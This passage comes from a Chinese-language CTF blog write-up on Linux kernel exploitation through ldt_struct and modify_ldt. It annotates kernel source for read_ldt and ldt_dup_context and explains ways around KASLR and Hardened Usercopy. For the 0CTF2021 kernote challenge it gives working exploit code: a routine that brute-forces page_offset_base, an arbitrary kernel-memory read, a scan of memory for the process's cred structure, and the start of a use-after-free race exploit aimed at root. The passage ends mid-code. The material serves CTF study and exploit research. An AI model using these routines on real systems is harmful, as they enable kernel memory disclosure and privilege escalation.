class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) {</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) {</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != bytecount) {</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) {</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>关键部分:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) {</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>还是像之前一样,在write_ldt时已经通过uaf获得了ldt的读写能力,于是便可以完成任意读.<br>但任意读通常受限于KASLR.</p><p>如何完成信息泄露绕过KASLR呢?可以利用copy_to_user对内核地址的检测(若不合法则返回错误码而不是panic),来不断爆破kernel .text段的基址以及page_offset_base(线性映射区基址).</p><p>不过由于Hardened Usercopy的开启,当爆破到text段时会触发保护导致kernel panic.<br>好在page_offset_base + 0x9d000有secondary_startup_64函数的地址,读出来即可.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312271300827.png"></p><p>还有一种绕过Hardened_usercopy的办法.将要读取的数据在内核空间中转移(从内核内核的转移)到不会触发Hardened Usercopy的地方,再读出来.<br>借用a3大神的图.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312271322473.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!old_mm)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">  <span class="keyword">if</span> (!old_mm-&gt;context.ldt)</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">  new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line">  <span class="keyword">if</span> (!new_ldt) {</span><br><span class="line">    retval = -ENOMEM;</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">         new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line">  finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line">  retval = map_ldt_struct(mm, new_ldt, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (retval) {</span><br><span class="line">    free_ldt_pgtables(mm);</span><br><span class="line">    free_ldt_struct(new_ldt);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  }</span><br><span class="line">  mm-&gt;context.ldt = new_ldt;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">  mutex_unlock(&amp;old_mm-&gt;context.lock);</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>关键部分:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(old_mm-&gt;context.ldt-&gt;nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt) {</span><br><span class="line">  retval = -ENOMEM;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">       new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br></pre></td></tr></tbody></table></figure><p>流程已经非常熟悉了,uaf改old_mm-&gt;context.ldt-&gt;entries为想读的地址,拷贝到new_ldt-&gt;entries处,由于该地址是vmalloc区的合法地址,不会触发Hardened_usercopy关于代码段或跨页的保护,再使用read_ldt读出即可.</p><h2 id="例题-0CTF2021-kernote"><a href="#例题-0CTF2021-kernote" class="headerlink" title="例题 0CTF2021-kernote"></a>例题 0CTF2021-kernote</h2><p>内核菜单堆,能分配0x20字节的堆块(题目使用的slab分配器最小为0x20字节).可以额外保存一个并uaf写入8字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281627582.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281626828.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc_trace(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span><br></pre></td></tr></tbody></table></figure><p>在内核中小于等于0x20字节(再提一下,slab分配器最小堆块是0x20字节)的结构体中且能利用前8字节的常用有seq_operations,可以劫持控制流.但需要先获得内核地址.</p><p>这里使用0x10大小的ldt_struct来完成信息泄露.爆破线性映射区的地址,并搜索cred结构(为了搜索,先 pthread_setname_np来在struct cred的comm字段写入字符串).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOG(<span class="string">"Starting brute dma base"</span>);</span><br><span class="line">page_offset_base = ldt_guessing_direct_mapping_area(create_uaf,<span class="number">0</span>,editNote,<span class="number">0</span>,<span class="number">0x4000000</span>);</span><br><span class="line">HEX(page_offset_base);</span><br><span class="line"></span><br><span class="line">LOG(<span class="string">"Starting to Search struct cred"</span>);</span><br><span class="line">pthread_setname_np(pthread_self(),<span class="string">"HanQi.."</span>);</span><br><span class="line">serach_config sc = {.bufferSize=<span class="number">0x8000</span>,.searchString=<span class="string">"HanQi.."</span>,.searchStringsize=<span class="number">8</span>,.debug=<span class="number">0</span>,.constraint=is_cred_comm};</span><br><span class="line">ldt_seeking_memory(editNote,<span class="number">0</span>,page_offset_base,memsearch,&amp;sc);</span><br><span class="line">cred_addr = sc.Addtional;</span><br><span class="line">HEX(cred_addr);</span><br></pre></td></tr></tbody></table></figure><p>使用了a3大神的模板</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief burte-force hitting page_offset_base by modifying ldt_struct</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_cracker function to make the ldt_struct modifiable</span></span><br><span class="line"><span class="comment"> * @param cracker_args args of ldt_cracker</span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param burte_size size of each burte-force hitting</span></span><br><span class="line"><span class="comment"> * @return size_t address of page_offset_base</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_guessing_direct_mapping_area</span><span class="params">(<span class="type">void</span> *(*ldt_cracker)(<span class="type">void</span>*),</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *cracker_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                                        <span class="type">void</span> *momdifier_args,</span></span><br><span class="line"><span class="params">                                        <span class="type">uint64_t</span> burte_size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">uint64_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">uint64_t</span> temp;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make the ldt_struct modifiable */</span></span><br><span class="line">    ldt_cracker(cracker_args);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel direct mapping area by modify_ldt() */</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">        ldt_momdifier(momdifier_args, page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt; <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[x] no mm-&gt;context.ldt!"</span>);</span><br><span class="line">            page_offset_base = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        page_offset_base += burte_size;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> page_offset_base;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief read the contents from a specific kernel memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param addr address of kernel memory to read</span></span><br><span class="line"><span class="comment"> * @param res_buf buf to be written the data from kernel memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ldt_arbitrary_read</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *momdifier_args, <span class="type">size_t</span> addr, <span class="type">char</span> *res_buf)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">uint64_t</span> temp;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* init descriptor info */</span></span><br><span class="line">    init_desc(&amp;desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* modify the ldt_struct-&gt;entries to addr */</span></span><br><span class="line">    ldt_momdifier(momdifier_args, addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data by the child process */</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    <span class="keyword">if</span> (!fork()) {</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], buf, <span class="number">0x8000</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], res_buf, <span class="number">0x8000</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief seek specific content in the memory.</span></span><br><span class="line"><span class="comment"> * Note that we should call ldtGuessingDirectMappingArea() firstly,</span></span><br><span class="line"><span class="comment"> * and the function should be used in that caller process</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param ldt_momdifier function to modify the ldt_struct-&gt;entries</span></span><br><span class="line"><span class="comment"> * @param momdifier_args args of ldt_momdifier</span></span><br><span class="line"><span class="comment"> * @param page_offset_base the page_offset_base we leakked before</span></span><br><span class="line"><span class="comment"> * @param mem_finder your own function to search on a 0x8000-bytes buf.</span></span><br><span class="line"><span class="comment"> *          It should be like `size_t func(void *args, char *buf)` and the `buf`</span></span><br><span class="line"><span class="comment"> *          is where we store the data from kernel in ldt_seeking_memory().</span></span><br><span class="line"><span class="comment"> *          The return val should be the offset of the `buf`, `-1` for failure</span></span><br><span class="line"><span class="comment"> * @param finder_args your own function's args</span></span><br><span class="line"><span class="comment"> * @return size_t kernel addr of content to find, -1 for failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ldt_seeking_memory</span><span class="params">(<span class="type">void</span> *(*ldt_momdifier)(<span class="type">void</span>*, <span class="type">size_t</span>), </span></span><br><span class="line"><span class="params">                        <span class="type">void</span> *momdifier_args, <span class="type">uint64_t</span> page_offset_base,</span></span><br><span class="line"><span class="params">                        <span class="type">size_t</span> (*mem_finder)(<span class="type">void</span>*, <span class="type">char</span> *), <span class="type">void</span> *finder_args)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">0x8000</span>];</span><br><span class="line">    <span class="type">size_t</span> search_addr, result_addr = <span class="number">-1</span>, offset;</span><br><span class="line"></span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);</span><br><span class="line"></span><br><span class="line">        offset = mem_finder(finder_args, buf);</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) {</span><br><span class="line">            result_addr = search_addr + offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_addr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>接下来只用将cred的euid,egid写为0即可.这一部分注意事项挺多.</p><p>首先,由于write_ldt或进程退出会释放当前ldt_struct及其entries,而之前在搜索时我们的entries已经被修改成了一个不合法的位置,释放会导致kernel panic.所以我们不能在当前进程进行操作,而是fork出一个子进程A,且保证当前进程不会退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202312281153655.png"></p><p>第二,由于我们搜到的cred结构是当前进程(线程)的,所以最后起shell还是应该使用主进程.那么我们需要再次fork一个进程来进行修改ldt_entries进行竞争,记作B.</p><p>第三,由于要让A取到B制造的uaf,需要首先绑定到同一个CPU.又由于要竞争,需要在制造uaf后将B绑定到另一个CPU(暂未验证单个CPU的多个进程能否在内核中发生竞争,之后会看些Linux进线程调度的东西).顺便提一句,制造uaf要在fork之后,否则fork过程中会使用uaf出的堆块.</p><p>第四,由于内核中对0x20的堆块分配还是比较多的,经验证(指查看官方wp,笔者还未找到较好的计算方法,目前的想法是通过gdb插件dump出当前cpu_cache的free_list再比较最终获得的地址)write_ldt会分配到id为11的堆块.</p><p>最后就是调整时序来提高条件竞争的命中率?(ps:经测进程间信号量在sem_post时会炸).</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>这个竞争窗口确实很短,笔者这个脚本爆了近200次才打通,一直以为哪里写错了.可以设置一次old_nr_entries为8000增大竞争时间,改了后出过一次14次打通.<br>(官方wp稳定在30-50次,应该是时序控制的问题)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">addNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6667</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6668</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chooseNote</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6666</span>,idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editNote</span><span class="params">(<span class="type">size_t</span> dummy,<span class="type">size_t</span> value)</span></span><br><span class="line">{</span><br><span class="line">    ioctl(dev_fd,<span class="number">0x6669</span>,value);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_uaf</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">{</span><br><span class="line">    addNote(idx);</span><br><span class="line">    chooseNote(idx);</span><br><span class="line">    delNote(idx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">serach_config</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">size_t</span> bufferSize;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* searchString;</span><br><span class="line">    <span class="type">size_t</span> searchStringsize;</span><br><span class="line">    <span class="type">size_t</span> Addtional;</span><br><span class="line">    <span class="type">int</span> (*constraint)(<span class="type">size_t</span>* searchStringAddr);</span><br><span class="line">    <span class="type">int</span> debug;</span><br><span class="line">}serach_config;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_cred_comm</span><span class="params">(<span class="type">size_t</span>* result_addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (result_addr \</span><br><span class="line">        &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">        &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">        &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == getpid()))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">memsearch</span><span class="params">(serach_config* sc,<span class="type">const</span> <span class="type">char</span>* buffer)</span> {</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* result_addr = (<span 